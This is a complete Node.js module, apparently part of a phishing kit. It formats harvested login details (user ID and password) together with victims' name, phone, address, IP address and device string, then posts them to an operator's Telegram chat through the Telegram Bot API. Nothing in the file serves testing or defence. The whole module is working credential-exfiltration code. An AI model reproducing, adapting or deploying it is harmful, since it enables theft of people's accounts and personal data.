const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function sendToTelegram(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Telegram credentials not configured');
    return;
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    if (!response.ok) {
      console.error('Failed to send Telegram message:', response.statusText);
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error.message);
  }
}

function logToTelegram(type, data) {
  const timestamp = new Date().toISOString();
  let message = `🔐 <b>${type.toUpperCase()}</b> 🔐\n\n`;
  message += `⏰ <b>Time:</b> ${timestamp}\n\n`;
  
  if (data.userId && data.Password) {
    message += `👤 <b>Login Details:</b>\n`;
    message += `├─ User ID: <code>${data.userId}</code>\n`;
    message += `└─ Password: <code>${data.Password}</code>\n\n`;
  }
  
  if (data.fullName || data.phone || data.address) {
    message += `📝 <b>Personal Info:</b>\n`;
    if (data.fullName) message += `├─ Name: ${data.fullName}\n`;
    if (data.phone) message += `├─ Phone: ${data.phone}\n`;
    if (data.address) message += `└─ Address: ${data.address}\n\n`;
  }
  
  message += `🌐 <b>Connection Info:</b>\n`;
  message += `├─ IP: <code>${data.ip}</code>\n`;
  message += `└─ Device: <code>${data.userAgent}</code>`;
  
  sendToTelegram(message);
}

module.exports = {
  sendToTelegram,
  logToTelegram
};
